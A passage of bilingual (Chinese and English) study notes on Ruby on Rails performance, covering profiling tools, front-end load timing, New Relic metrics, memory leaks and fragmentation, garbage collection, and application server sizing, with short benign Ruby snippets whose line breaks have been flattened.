time沒有影響，對\n\nthroughput有影響\n減少user在queue中的等待時間有影響\n\n如果在queue中平均等待的人數少於1，或是在queue中等待的時間太短\n\nscale的效果就不明顯\nserver沒有全力工作(100%)\n\n\n所以要在到達這個點之前先scale\n\n如果avg. response time慢，更應該如此\n\n但要注意邊際遞減 (Amdahl’s law)\n\n\n\n\n\n\n\nThe Performance Workflow\n\n有沒有metrics怪怪的\nprofile找兇手，在哪邊花了最多時間\n做小範圍的benchmark，測時間或是花費資源\n\ndevelop環境的benchmark結果會與production的有差距\n\n例: 500ms in production vs 1000ms locally\n\nGenerally a factor of 3 is acceptable\n\n\n\n\nprofile的結果不一定準\n\n如果把佔了50%的method拿掉，不一定讓結果變好50%\n\n\n\n\n做整體的benchmark與profile，確定改的是對的\n\nprofile\nprofile: 測code各個部位的資源占比\nprofile mode\nmode不同讓測出來的時間不一樣\n\nCPU - clock counter\n\n數clock cycles\n\n“Amount of clock cycles” / “CPU frequency”\n但現在cpu會stepping\n\nload重的時候把clock frequency調高\n\n\n\n\nsystem-wide\n\n改用time stamp counter去算時間\n這樣其他工作也會影響到當前的profile\n\n\n建議\n\nUse CPU time when you’re interested in seeing the profile without I/O\n\n\n\n\nWall time\n\n就是看start之後扣掉end\n\nwall就是牆上的時間\n\n\n影響到當前的profile\n\n其他process使用相同的資源\nNetwork or I/O\n\n\n建議\n\nDespite its flaws, wall time is usually the mode you’ll want to use\n\n\n\n\nProcess time\n\n只測量目前process花的時間\n\n不包括forked的process\n\n\n建議\n\nprocess time, if available, is usually a better choice over CPU time.\nIf you have code that spawns subprocesses, you may need to stick with CPU time (or wall time).\n\n\n有的profiler把cpu time當成這裡的process time\n\n\n\n還有測量方式，profiler都是看在stack上花的時間去算占比\n\nTracing\n\n每個invoke都記錄\n\n超準\n超浪費資源\n\n\n\n\nSampling\n\n一定時間固定去看stack的樣子，紀錄占比\n\n要抽樣夠多次才準\n\n\n因為資源占比小，所以可以放在prodution環境中看profile\n\n\n\nruby: Ruby-Prof\nRuby-Prof直接與MRI掛勾(tracing)，所以一但跑了就會比平常慢2到3倍\nrequire 'ruby-prof'SORTED_ARRAY = Array.new(10_000) { rand(100_000) }.sort!array_size = SORTED_ARRAY.sizeRubyProf.measure_mode = RubyProf::CPU_TIMEresult = RubyProf.profile do    1_000_000.times { bsearch2(SORTED_ARRAY, rand(array_size)) }endprinter = RubyProf::FlatPrinter.new(result)printer.print(STDOUT)\n%self total self wait child calls name17.22 19.117 12.777 0.000 6.340 13182869 Fixnum#==8.54 6.340 6.340 0.000 0.000 13182869 BasicObject#==5.73 71.918 4.252 0.000 67.666 14182869 *Object#bsearch22.14 74.196 1.590 0.000 72.606 1 Integer#times0.93 0.688 0.688 0.000 0.000 1000000 Kernel#rand0.68 0.508 0.508 0.000 0.000 1000000 Array#count0.00 74.196 0.000 0.000 74.196 1 Global#[No method]\n%self: 花在這個method的時間占比\ntotal: 這個method與child共花了多少時間\nself: 這個method花了多少時間\nchild: total - self\ncalls: 被call了幾次\n從%self的下手!!\nruby: Stackprof\n做sampling的profiler是rack-mini-profiler的backend\n一般不會在開發時使用，因為Ruby-Prof比較準\nrack: rack-mini-profiler\n除了一般的profile還可以看\n\nSQL query\nserver response time\nmethod的flamegraph\nmemory leak(gc)\n\n同時rack-mini-profiler本來就是設計給production用的!!\n記得，如果在profile速度時，要調到prodution mode，因為development mode會有需多方便開發的功能把速度拖慢\n裝完就可以啟動網站，之後網頁會出現一個badge裡面大概像\n\n之後就可以問\n\nHow many SQL queries am I generating?\n\n一般來說一個orm的class就只會有一條SQL\n一個簡單page一般來說是1~3條SQL\n\n\nWhat’s my total request time?\n\n一般會希望在50ms以下\n\n\nWhat % of time am I spending in SQL?\n\n最好使用production的DB去測\n\n通常production的資料量遠比develop大\n\n\n\n\nHow long until DOMContentLoaded fires?\n\n從收到response到出現在畫面上需要一段過程\n\n這留到前端優化\n\n\n\n\nAre any of the parts of the page taking up an extreme amount of time compared to others?\n\n往有SQL的項目點，可以看partial render時間與SQL時間，與花在這個項目的時間(左邊)\n\n那中間差的時間呢?\n就是在code上的，詳細的需要看flamegraph\n通常遇到partial的SQL可以試著\n\n把整個拿掉\ncache partial\n善用includes一次多load一點\n\n另外還有profile-gc、profile-memory可以看記憶體與gc的情況!!\nprofile-gc就是GC.stat，可以看\n\nNew bytes allocated outside of Ruby heaps\n\n過了10MB要特別注意\n\n\nObjectSpace delta caused by request\n\n收到req之後多了多少物件與哪種物件\n\n\n\nrack-mini-profiler利用profile-memory去看\n\nallocated memory by gem\nallocated memory by file\nallocated objects by gem\n\nmemory profile\n因為多了vm這一層，所以memory profile變得很麻煩\n下面的工具都是基於MRI的\nObjectSpace and objspace.so\nObjectSpace就是所有object的存放地，因為是與MRI深度綁定，所以不要在prodution用\n下面來看看有什麼有趣的功能\n像ObjectSpace.count_objects\nirb(main):001:0&gt; ObjectSpace.count_objects=&gt; {:TOTAL=&gt;53802, :FREE=&gt;31, :T_OBJECT=&gt;3373,:T_CLASS=&gt;888, :T_MODULE=&gt;30, :T_FLOAT=&gt;4,:T_STRING=&gt;36497, :T_REGEXP=&gt;164, :T_ARRAY=&gt;9399,:T_HASH=&gt;789, :T_STRUCT=&gt;2, :T_BIGNUM=&gt;2, :T_FILE=&gt;7,:T_DATA=&gt;1443, :T_MATCH=&gt;85, :T_COMPLEX=&gt;1,:T_NODE=&gt;1050, :T_ICLASS=&gt;37}\n好懂的好懂，但還是有些怪怪的\n\nT_NODE: AST\nT_DATA: interrupter自己的東西\n\n這裡就看我們知道的基本type就好\n利用這個與gc開關可以來寫個簡單的benchmark看一段code產生多少object\ndef allocate_count    GC.disable    before = ObjectSpace.count_objects    yield    after = ObjectSpace.count_objects    after.each { |k,v| after[k] = v - before[k] }    after[:T_HASH] -= 1 # probe effect - we created the before hash.    after[:FREE] += 1 # same    GC.enable    after.reject { |k,v| v == 0 }endallocate_count { 100.times { 'hello' + 'hi' }}\n同時也可以看現在有多少存活的object\nputs ObjectSpace.each_object.countputs ObjectSpace.each_object(Numeric).countputs ObjectSpace.each_object(Complex).countObjectSpace.each_object(Complex) { |c| puts c \n看一個type總共花的多少mem\nirb(main):057:0&gt; ObjectSpace.count_objects_size{:T_OBJECT =&gt; 198560,:T_CLASS =&gt; 614784,:T_MODULE =&gt; 66712,:T_FLOAT =&gt; 160,:T_STRING =&gt; 1578522,:T_REGEXP =&gt; 122875,:T_ARRAY =&gt; 630976,:T_HASH =&gt; 165672,:T_STRUCT =&gt; 160...\n看看這個物件佔了多少mem\nirb(main):062:0&gt; ObjectSpace.memsize_of(\"The quick brown fox jumps over the lazy dog\")40 # NOT ACCURATEirb(main):063:0&gt; ObjectSpace.memsize_of(\"The quick brown fox\")40irb(main):064:0&gt; ObjectSpace.memsize_of([])40irb(main):065:0&gt;ObjectSpace.memsize_of(Array.new(10_000) { :a })80040\n為什麼是40?\nruby vm的RVALUE大小就是40bytes\n使用時機:\n\n各種try，以增加gc的知識\n用 ObjectSpace.each_object 去check live objects\n如果市面上的profiler不行了，可以hack這個來做profile\n\nGC::Profiler\nruby的gc是generational garbage collector\n\n看object活過幾次GC來對object分類\n\n活過一次就是old\n\n可以看old_objects(GC.stat)找有沒有memory leak發生\n\n如果這個值慢慢上升就是中了\n\n\n\n\n\n\nMinor GCs\n\n只挑new處理\n核心思想是 通常object沒有幾個會活很久\n\n\n\nGC.count就是從執行程式以來GC被執行的總次數，包含major與minor\nGC.stat就是各種參數，除了GC的還有memory本身的各種數值\n跑跑GC::profiler吧\nGC::Profiler.enablerequire 'set'GC.startGC::Profiler.reportGC::Profiler.disable\nGC 133 invokes.Index Invoke    Time(sec)    Use Size(byte)    Total Size(byte)    Total Object    GC Time(ms)1    1.966    801240    6315840    157896    2.33700000000003349498\ninvoke的值與GC.count一樣也就是，這是從執行程式以來GC被執行的總次數\n使用時機:\n如果gc跑太久，GC與GC::Profiler是個很好的開始\nderailed_benchmarks\n這個是看memory用量，可以追memory bloat\n像bundle exec derailed bundle:mem\n會列出每個gem用多少memory\ndelayed_job: 18.9805 MiB (Also required by:delayed/railtie, delayed_job_active_record)delayed/performable_mailer: 17.8633 MiBmail: 17.8555 MiB (Also required by: TOP)mime/types: 12.9492 MiB (Also required by:/Users/nateberkopec/.gem/ruby/2.3.0/gems/rest-client\u00021.8.0/lib/restclient/request,/Users/nateberkopec/.gem/ruby/2.3.0/gems/rest-client\u00021.8.0/lib/restclient/payload)mail/field: 2.0039 MiBmail/message: 0.8477 MiBdelayed/worker: 0.6055 MiBrails/all: 15.8125 MiBrails: 7.5352 MiB (Also required by:active_record/railtie, active_model/railtie, and 10others)rails/application: 5.3867 MiB[… continues on and on]\n跑app多次，看最後花了多少mem\nderailed exec perf:mem_over_time\n如果持續上升，memory leak\n看object到底在哪產生的\nderailed exec perf:objects\n可以用來追哪個指令用memory太兇\n使用時機:\n\nbundle:mem來check gem的mem占量，與減少mem bloat\ntrace mem leak\n\nmemory_profiler\nmemory_profiler其實是derailed_benchmarks的backend\nmemory_profiler可以只對一段code做profile\nrequire 'memory_profiler'report = MemoryProfiler.report do    # run your code hereendreport.pretty_print\n之後的report會有\n\nRetained memory\n\n在跑profiler之前就在的object\n\n\nAllocated memory\n\n跑profiler時alloc的object\n\n高Allocated memory代表gc會跑比較多次，程式會變慢\n\n\n\n\n\n另外，memory_profiler跑出來的usage與會比ps看到的少，因為ruby有memory fragmentation\nmemory_profiler也可以profile c extendsion的memory\n使用時機\n\n要追non-Rack-app與background jobs的mem issue\nRack的app可以用 derailed and rack-mini-profiler\n\nfront-end: chrome timeline\n對於end-user而言，Server response times(100ms~300ms)不是重點，因為占比很小(10%)\n整個load time大概是1~3秒\n\n\ngzipped size對於花多久時間下載很重要\n\n\nunzip 後的size對花多久時間parse與construct很重要\n\n\nNew Relic的real user monitoring (RUM)可以提供大概end-user感覺的page load time\n\n\nChrome Timeline可以看到每一步的實際狀況\n\nChrome Timeline同時會記錄其他extensions的事件!! (記得關其他extendsion)\n\n\n\n整個流程 (從browser的角度)\n\nDNS/TCP/SSL setup\ndownload html\nparsing html. 一但遇到其他資源就停下parse等載好跑完才會繼續parse\n\ncss不會擋parse\njs上async或是defer不會擋parse\n\n\n剛剛提到不會被擋的東西，preloader會在他簡單掃過後去preload!!\n\n所以我們要\n\nDon’t stop the parser.\n\npreloader會在parser跑之前先掃看有沒有可以先下載的東西\n\nhead, script, …\n\n\n如果用js做動態生dom(script)，這樣preloader看不到!!\n\n\nGet out of the browser preloader’s way.\n\npreloader不吃\n\niframe\nwebfont\nHTML5 audio/video\ncss @import\n\n\n\n\nUse HTTP caching - but not too much.\n\n把常用的設成cache，自己打包(jquery…)\n\n如果賭user有大廠的api(來自google的cdn之類)\n\n有，沒事\n沒有，整個parse被block!!\n\n\n\n\n\n\nUse the Resource Hint API.\n\nDNS Prefetch\nPreconnect\nPrefetch\nPrerender\n\n\n\n整個流程 (從網頁的角度)\n\n送request，等response\n\n這不會出現在timeline上，前面的空白就是這段時間\n包含\n\nservice response time (大約10ms)\nnetwork latency (大約10ms~300ms，看有沒有跨境)\n\n光速從新加坡到US都要花70ms!!\n\n\n\n\n\n\nReceive Response\n\n在收到任何byte就會有這一事件\n這就是下載，完成下載後會有Finish Loading\n\n所以後面會看到很多這個event\n\n\n\n\nParse HTML\n\n把html轉成dom\n下載需要的resource\n\n&lt;script src=\"/assets/application.js\" async=\"async\" ... /&gt;\n\n這個有加async，所以不會block整個parse\n如果沒加parse會等下載完才繼續\n\n\nCSS不會block\n\n\n跑裡面寫的JS (會有對應的js)\n\nasync會下載完直接跑(中斷parse)\ndefer會下載完等parse跑完再跑\n\n\n\n\nRecalculate Styles\n\nparse CSS 把 DON 轉成 CSSOM\n如果css還沒載完?\n\n先用browser預設的\n\n\n如果這邊花很久時間，代表css太複雜了\n\n\nLayout\n\n走訪DOM，算\n\nvisibility\napplicable CSSs tyles\nrelative geometry (width)\n\n\n複雜的CSS與HTML會讓這事件變久\nlayout thrashing(reflow)\n\nAny time you change the geometry of an element (its height, width, whatever), you trigger a layout event\n一般browsers不知道哪邊要重算\n\n因此大部分都是全部重算(reflow)\n\n\n通常發生在\n\njs在搞dom\n太多張stylesheets\n\n\nWhat forces layout / reflow\n\n\n\n\nDomContentLoaded\n\nhtml與css與沒有標async的js(整個html)都跑完了 (照順序跑)\n\n但其他資源還沒載完\n\n都載完會trigger load\n\n\n實際體驗\n\n\n但現在不會有任何東西在畫面上\n\n\nPaint\n\n把CSSOM畫在畫面上!!\n\n\n\n之後可能還有其他CSS,JS\n就會再產生對應的事件\n怎麼用timeline來profile\n\nHard reload (ctrl-shift-r) and load the Timeline with fresh data\nLook at the pie graph for the entire page load\n\nReduce Idle\n\nslow server responses\nasset requests\n\n\nReduce Loading\n\nHTML/CSS太大了\n\n\nReduce Scripting\n\n通常是花在下載其他的script\n\n\n\nasync or defer\n\n\n\n\n或是對js做profile\n\n\nReduce Rendering and Painting\n\n這與css優化有關\n\n\n\n\n\n為什麼要整成一包?\nHTML, TCP and latency are the problems, not bandwidth.\n與render或是執行相比，network latency其實很重\n一個inline的1MB page與有著100個external request的1MB page，一定是inline的最快，光是當下載就飽了\n重點是什麼時候畫，什麼時間載入不是重點\n對於end-user而言最重要的時間\n\nFirst paint: 雖然說只會看到框框，但還是很重要，這與人感知速度有關\nFirst paint of text content\nThe load event\n\nEncoding\n\nhttp header\nmeta tag\n\n要放在第一個，不然會讓parse從頭再跑一次\n\n\nbrowser去猜\n\nViewports\n要放在第一個，不然之後有css會讓browser去reflow\ncss first\n如果有js的head，且沒有async，這種情況下把js的head放css前面，這樣會讓css的下載被block\n3rd-party: New Relic\ndevelopment &amp; production 環境會有差異的原因\n\nApplication settings\n\ncode reloading\n\n\nCaching behavior\nDifferences in data\n\nproduction資料量一定比較大(用includes)\n\n\nNetwork latency\n\n大概數字\n\n在同一個城市: 10ms\n在兩個州之間: 20ms\n從US東到US西: 100ms\n到世界的另一邊: up to 300ms\n如果是手機網路，可能要再乘4倍\n\n\n\n\nJavaScript and devices\n\n同樣的js code不同的裝置\n\nPC\nmobile: 跑起來比較痛苦\n\n\n\n\nSystem configuration and resources\n\n同樣的container可以跑在不同硬體上\n程式用不同的compiler或是compile flag編\n\n\nVirtualization\n\nnegatively and unpredictably impact performance when one virtualized server is hogging up the resources available\n\n\n\nNew Relic: profile in production env\nTransactions: response\nReal-User Monitoring (also RUM and Browser monitoring):\n\n在每頁插入JS測時間\n\nNavigationTimingAPI\nEvents set include domContentLoaded, domfomplete, requestStart and responseEnd\n\n\n\nprocess time\nThe web transaction response time graph\n預設時間是30mins，我們要看時間的越長越好，最好是一個月，new relic最長到7天，但也夠了\n純後端性能\n\n\n\nApp server avg response time\nStatus\n\n\n\n\n&lt; 100ms\nFast!\n\n\n&lt; 300ms\nAverage\n\n\n&gt; 300ms\nSlow!\n\n\n\n如果是JSON的API server，可以把時間再減半\n後端加前端性能\n\n\n\nBrowser avg load time\nStatus\n\n\n\n\n&lt; 3 sec\nFast!\n\n\n&lt; 6 sec\nAverage\n\n\n&gt; 6 sec\nSlow!\n\n\n\nNext, I’m considering the shape of the response time graph\n\n重點是在每個部分中，時間都花到哪裡去了\n\n一般來說應該花在ruby上最多\n如果database, web external, or other processes比較多就是有問題\n\nweb external就是有人在等外部API\nrequest queueing代表需要更多server\n\n\n\n\n這裡是看哪次request(transaction)最特別\n看最左(95th Percentiles)，去做優化\n但也要記得看最右，為什麼這麼快，Are they asset requests? Redirects? Errors?\nAre they asset requests? Redirects? Errors?\n\n\n\nRequests per minute\nScale\n\n\n\n\n&lt; 10\nShould only have 1 server/Heroku dyno.\n\n\n10 - 1000\nAverage\n\n\n&gt; 1000\nHigh. “Just add more servers” may not work anymore.\n\n\n\n大於1000時就要考慮怎麼處理databases或是cache stores，以及引入devops\nTransactions\n如果requests-per-minute scale靠前，用most time consuming排序(80%時間花在20%的controller)\nrequests-per-minute小，用slowest average response time排序\n因為把一個100ms的response變成10ms對user體驗沒有太大影響(所以注意超過500ms的request)\ndatabase\n用most time consuming看有沒有query太久\n常見病症\n\nLots of time in #find\n\nPay attention to the “time consumption by caller” graph\n\nwhere is this query being called the most?\n\nGo check out those controllers and see\n\nwhere的欄位沒有index\nN+1 query\n\n\n\n\n\n\n\n\nSQL - OTHER\n\nRails periodically issues queries\n\n別管他們\n\n\n\n\n\nExternal Services\n\nMost Ruby applications will block on network requests\n一般Rails會被外部API的request給block\n根據不同的timeout，可以delay載入大概200ms~500ms，如果是95th percentile還可以到20秒\n一個是用background worker去跑，把東西放到cache\n或是設定Circuit Breaker，如果看到request一直timeout讓之後的request直接fail\nGC stats and Reports\n不準，忘了他\nBrowser / Real user monitoring (RUM)\n\n切成“Browser page load time”，之後看每個元件的average load time\n\nRequest queueing\n\n通常最多10-20ms\n\n\nWeb application\n\n就是你的app，但注意到這裡的時間占比很小\n\n\nNetwork\n\n通常比 response + queueing 還久\n這是算雙向的時間\n\n\nDOM Processing\n\n花很多時間 &gt; Web application+Request queueing\n算load finish到DOMContentReady\n這個時候只是html parse完\n\n後面還有其他CSS與JS\n\n\n這個時候畫面還是白的\n\n\nPage Rendering\n\n算DOMContentReady到load\n\nDOMContentReady就是$(document).ready\nload就是所有資源都好了才會動\n\n\n到load之前，browser可能會顯示一些畫面\n\n\n\nTurbolinks &amp; “HTML-over-the-wire”\nHTML-over-the-wire與SPA差在一個傳HTML一個傳資料\n一般來說，rails app (大約1秒)\n\nreturn a response in 100-300ms,\nspend about 200ms loading the HTML and CSSOM, a few hundred more ms renderingand painting\nthen likely loads of JS scripting tied to the onload event.\n\nTurbolinks可以把上面的時間減少200-700ms\n代價\n\n不能用一般的方式寫js\n\nidempotent function\n不能往ready一直掛hook\n\n被Turbolinks拿去用了!! (load也被拿走了)\n\n所以要用其他事件\n\n\n\n\n\n\n不能與其他client side JS frameworks共存\n\nload被拿走了\n\n\n做Integration testing會很痛苦\n在mobile上基本沒用\n不能offline(SPA可以)\n\n常見錯誤\n\n確信這個page有被Turbolinks\n\n開console看有沒有Navigated to http://www.whatever.com/foo\n\n有就gg\n\n\n\n\n用dom append的方式改網頁\n\n因為Turbolinks是回傳整個html，所以應該\n\n用controller產生資料帶到erb，之後生html\n不是一直用js塞\n\n\n\n\n\n關於反應時間\n0.1秒: 很快\n1秒: 可以接受，也許有人會覺得慢\n10秒: 人能夠忍耐的上限，需要feedback讓user知道跑到哪了\nsource\nbenchmark\nbenchmark: 測code花多少時間或是花多少資源\n也許某段code的benchmark好，但是其實這段code的占比不大，那就不用特別去改\n還有可能是單單benchmark快，但是對整體沒有影響甚至是拖累整體\nrequire 'benchmark/ips'Benchmark.ips do |x|    SORTED_ARRAY = Array.new(10_000) { rand(100_000) }.sort!    array_size = SORTED_ARRAY.size    # Typical mode, runs the block as many times as it can    x.report(\"bsearch1\") { bsearch1(SORTED_ARRAY, rand(array_size))}    x.report(\"bsearch2\") { bsearch2(SORTED_ARRAY, rand(array_size))}    x.compare!end\n整個網站\n\nab\nwrk\n\nperformance之於企業\n\nCreate a Performance Culture\n\n用$衡量效率\n設定 a front-end load time\n\nDOMContentLoaded\nwindow.load\nstart render time\n\n\n設定 MART and/or M95RT\n\nSet a maximum average response time and/or a maximum 95th percentile response time for your server responses\nit’s important to capture what’s going on in the “long tail” as well as what’s happening to the average case.\n\n\n設定 a page weight\n\ncannot exceed &lt;projected user bandwidth in megabytes/second&gt; / &lt;load time budget in seconds&gt;\n\n\n設定 integration costs\nAdd automated performance and page weight tests\n\nAn acceptance test\n\nmake a GET request to this page\n\nrecord two or three numbers\n\nServer response time\nUser page load timings (DOMContentLoaded &amp; load)\n\n\n\n\nbenchmark “hot code”\n\n\nRun the performance acceptance tests separately from your unit and acceptance/integration tests.\n這一定有灰色地帶\n有第三方服務\n\nBlazemeter\nLoader.io\n\n\n\n\n\n\n\nDB optimization\n加index的好地方\n\nForeign keys\nPrimary keys\nPolymorphic relationships\nupdated_at\n\n給 Russian Doll caching\n\n\n\n當覺得sql效能怪怪的，用EXPLAIN\nMVCC會產生新資料與舊資料，通常在transaction好了之後舊資料會被清掉，但總是會有漏的\nVACUUM!!\n\n省空間\n讓query planner更有效率\n\nscale的時候，除了process變多，還有\nprocess是怎麼與shared resource溝通\n\ndatabase\nRedis, memcache, and other key-value stores\n\n這是重點的理由是\n連線數量有限制!!\n要記的算!!\n在test的時候，可以放鬆ACID，加快測試速度\n\ndb放RAMdisk\n把fsync 與 synchronous commit關掉\n\nRails slow?\n\nlog to disk\nuseless gems\n\nSprockets\nActionMailer\n…\n\n\nuseless rack middleware\n\nRack::Sendfile\nActionDispatch::Cookies\nActionDispatch::Session::CookieStore\nActionDispatch::Flash\nActionDispatch::RemoteIp\nActionDispatch::ShowExceptions\nActionDispatch::DebugExceptions\nActionDispatch::Callbacks\nActionDispatch::RequestId\nRack::Runtime\n…\n\n\n\nexception slow!!\nExceptions should not be used for flow control, use throw/catch for that.\nThis reserves exceptions for true failure conditions.\ncatch(:done) do    i = 0    loop do        i += 1        throw :done if i &gt; 100_000    endendfinish_up\nmemory bloat\n要看什麼?\n\nResident Set Size (RSS): process用到的記憶體 (包含shared)\n\nShared Memory\nPrivate Memory: 包含forked的child\n\nReal Memory = Shared Memory + Private Memory\n\n\n\n\n\n怎麼看?\n\nps\nget_process_mem\nOink\n\n減少memory bloat\n\nBeware Big Allocations\n\n不是說GC完所有不用的mem都會還回去\n\n可以看成還記憶體很慢\n\n\n替代方案是streaming: file.gets\n\n\nGemfile Auditing\n\n檢查gem: derailed_benchmarks\n\n\njemalloc\n\nptmalloc、tcmalloc与jemalloc对比分析\n\n\nGC Parameters\n\nMemory Leaks\n有不同等級\n\nManaged Ruby object leaks\nC-extension leaks\nLeaks in Ruby itself (the VM)\n\n| Item | Memory bloat | Memory leaks |\n| ———— | —— | ————— |\n| Allocated memory is actually required | Yes | No |\n| Growth | Fast and large | Slow and steady |\n| Levels off | Eventually | Never |\n一般來說大概2~3小時mem用量會平緩下來，最慢大概24小時\n沒有就有可能leak\n怎麼重現\n\n調高環境的記憶體上限與設定不要把process砍掉\n放著跑，看用量有沒有收斂\n\nsiege做多次測試，之後看\n\nRSS memory usage\nGC.stat[:heap_live_slots]\n\n這是有多少slot被object占用\n如果RSS上升，但這個不變\n\n可能是C-extension leak\n\n\n\n\nGC.stat[:heap_free_slots]\n\n這是沒有被object占用的slot\n如果這個數字大，代表\n\nruby vm沒有把mem還給記憶體\n有人alloc大量記憶體之後就不用了\n這是 memory bloat\n\n\n\n\nObjectSpace.count_objects\n\n這是目前在ruby vm中的object數量\n如果有個type的object一直漲，代表\n\nRuby memory leak\n\n\n\n\n\n這裡有一個小程式可以看上面的訊息\nThread.new do    logger = Logger.new('mem_log.txt')    logger.formatter = proc { |sev, date, prog, msg| msg }    headers = [        \"RSS\",        \"Live slots\",        \"Free slots\",        ObjectSpace.count_objects.keys    ].flatten    logger.info headers.join(\",\")    while true        pid = Process.pid        rss = `ps -eo pid,rss | grep #{pid} | awk '{print $2}'`        memory_info = [            rss.strip,            GC.stat[:heap_live_slots],            GC.stat[:heap_free_slots],            ObjectSpace.count_objects.values        ].flatten        logger.info memory_info.join(\",\")        logger.info \"\\n\"        sleep 5    endend\n把上面的code放到config/initializers，之後就會有csv\n這樣就可以用seige打打看，生10~15k的資料，之後就可以分析了\n\nManaged Ruby object leaks\n\nheap live slots &amp; RSS 上升, heap free slots不高\n用memory_profiler看 retained objects by location\n\n\nC-extension leaks\n\nheap live slots &amp; heap free slots不變, RSS 上升\nRuby的Heap dumping\njemalloc Introspection\n\n\nLeaks in Ruby itself (the VM)\n\nheap live slots &amp; heap free slots不變, RSS 上升\n\n但是找不到任何C-extension leak!!\n\n\n直接回報\n\n\n\n真的不行了就Worker-Killers\nMemory Fragmentation\nMemory fragmentation會讓mem usage對數上升，直到一個可怕的limit\n主要原因在於ruby沒辦法移動meme中的obj\nObjectSpace就是ruby vm的mem，slot存的就是RVALUE(40 bytes)，也就是object的指標\nRVALUE會被集合在一起成一個page\n所以ruby其實本身也有Fragmentation\n看到GC.stat\n\nheap_live_slots: 代表現在有被RVALUE占用的slot有多少 aka 現在有多少object活著\nheap_eden_pages\n\neden_page是至少有一個活著的slot的page\ntomb_page就是都沒有一個活著的slot的page\n\ntomb_page才可以還給OS\n\n\n\n\nheap_sorted_length\n\n一開始分配mem都是一塊一塊配上去\n\n這個以分配的長度是heap_sorted_length\n\n\n但是如果中間有幾塊被free了…\n\nheap_sorted_length不變，因為不是連續的\n但是中間的就沒辦法用了 (Fragmentation)\n\n\n\n\n\n所以可以用兩種方式看Fragmentation\n\nheap_live_slots / heap_eden_pages的slot數量\n\nGC.stat[:heap_live_slots] # 24508GC.stat[:heap_eden_pages] # 83GC::INTERNAL_CONSTANTS[:HEAP_PAGE_OBJ_LIMIT] # 408# 1 - live_slots / (eden_pages * slots_per_page)# 24508 / (83 * 408) = 72.3# 100% - 72.3% = 27.7%\n\nGC.stat[:heap_sorted_length]/GC.stat[:heap_sorted_length]\n\nper-thread memory arena\n\nWe call malloc in a thread\nThe thread attempts to obtain the lock for the memory arena it accessed previously\nIf that arena is not available, try the next memory arena\nIf none of the memory arenas are available, create a new arena and use that\n\n同時加回去arena的list\n\n\n\n所以arena其實就是記憶體!!\n但現在如果沒有限制arena數量的話\n\n變成有好幾塊小塊的記憶體沒辦法合併\nruby的ptr不能被移動 (RVALUE的ptr直接指到mem)\n\narena少，mem usage少，但contention會變多\n所以下次遇到\n\nReduce Memory Arenas(改MALLOC_ARENA_MAX)\nUse jemalloc\nCompacting GC (夢想)\n\n關於application server本身\naws與heroku很好scale，也同時讓人容易過度scale\n\nScaling increases throughput, not speed.\nscale只有在有queue時才會提升response times\n\n所以別只看response times做scale，要看有多少queue的request\n因為不同server的io model與process/thread model不同，讓server在scale上有巨大的差別\nThe life of a request\n重點是request會被queue在哪裡\n\nload balancer\nHeroku router\n\nit will then wait up to five seconds for that dyno to accept the request and open a connection.\n\n\navailable host\n\nbacklog: the socket on the dyno will accept the connection even if the webserver is busy processing other requests.\n\n\n\n上面最重要的有兩點\n\nrouter會等5秒直到成功連線\nrequest可以活在host的backlog中 (server要有這功能)\n\nserver在scale上差在?\n主要是處理兩件事\n\nslow client protection\n\nrequest buffering，會等req下載好了才會轉給app\n\n\nslow response protection\n\nkind of concurrency - either multithreading or multiprocess/forking\n\n至少不會卡IO (如果thread有特別處理)\n但如果是multithread會因為GIL，讓其他人不能用cpu\n\n所以ruby的multithreading對cpu-bound的request不好\n\n\n\n\n\n\n\n這樣看下來只有\n\nPuma in clustered mode\nPhusion Passenger 5\n可以用於scale server\n\n設定server參數\n目標\n\n讓memory 與 CPU使用最大化\n讓throughput最大化\n\n要4個要注意的\n\nprocess數目\n\nprocess才是真的平行\n建議一台最少3個process\n\n最多?\n\n要看mem與cpu\n\nmem\n\n不能太多mem，不然會overcommit與swap\n測ruby app的mem用量\n\n放著跑12~24小時\n用ps看\n\n\nprocs = (TOTAL_RAM / (RAM_PER_PROCESS * 1.2))\n\n\ncpu\n\n每5分鐘或15分鐘看cpu load\n\n如果靠近或是到100%，就減少process數量\n\n\nprocs = 1.2~1.5倍的hyperthread\n\n\n\n\n一般來說是8個\n\n\n\n\n多process的好處是?\n\n可以讓OS做load balance\n比讓load balancer做load balance還要好\n\nOS可以知道process的狀態!!\n\n\n\n\n\n\nthread數量\n\nruby的thread只能處理IO(db)\n所以要多少\n\n最多5~6個\n再多就會\n\n碰Amdahl’s law\nmem會被吃爆(看mem fragmentation)\n\n\n\n\n\n\ncopy-on-write\n\n在init好了之後fork (preload)\n但省的空間沒有想像的多\n\n如果用大分頁，只要改一個bit就會被copy，導致copy大量資料\n\n想想ruby vm怎麼用page的，好幾個object塞同一個page\n\n\nfragmentation!!\n\n\n\n\nContainer size\n\n就是cpu與mem要多少\n針對\n\n你的app需求 (吃mem? 吃cpu?)\n前面提到的process數量\n\n3process，ruby app一個大約300MB\n\n所以mem至少要1G\n\n\n\n\n\n\n\n\n\n步驟\n\n找出1 process跑5 thread要多少mem\n一個child process需要 (TOTAL_RAM / (RAM_PER_PROCESS * 1.2))\n\n一台需要3個process，以此推算出需要的總mem\n\n\n確認hyperthread的數量夠\n\nchild process的數量要等於1.25~1.5的hyperthread\n\n\nmonitor cpu與mem usage，調整process數量與container的規格\n\ngc\nGenerational GC認為通常都是年輕的object掛掉，所以分成兩個gc\n\nminor gc只處理new object(活不超過3以下的object)\n\n在沒有free slot啟動\n\n處理new object、在remember set的object、沒有write barrier的object\n\nremember set: 一群old object但是有new object的ptr\nwrite barrier: ruby runtime與object之間的interface\n\n\n\n\n\n\nmajor gc處理所有object\n\n在下面2種case下啟動\n\n跑完minor gc後還是沒有free slot\n4個limit的其中一個超標\n\nmalloc_increase_bytes_limit\n\nmalloc_increase_bytes\n\n當RVALUE不夠存時需要alloc資料到其他地方\nmalloc_increase_bytes就是他的大小\n\n\n\n\noldmalloc_increase_bytes_limit\n\n與malloc_increase_bytes同樣道理但是只針對old\n\n\nold_objects_limit\n\nold object的slot\n\n\nremembered_wb_unprotected_objects_limit\n\nremembere set與沒有write barrier的object\n\n\n\n\n\n\n\n\n\ntrace gc count可以看r background job是不是會一直觸發gc\n像下面就是可以用來trace的midleware\nclass GCCounterdef initialize(app)    @app = appenddef call(env)    gc_counts_before = GC.stat.select { |k,v| k =~ /count/    @app.call(env)    gc_counts_after = GC.stat.select { |k,v| k =~ /count/    puts gc_counts_before.merge(gc_counts_after) { |k, vb, va| va - vb 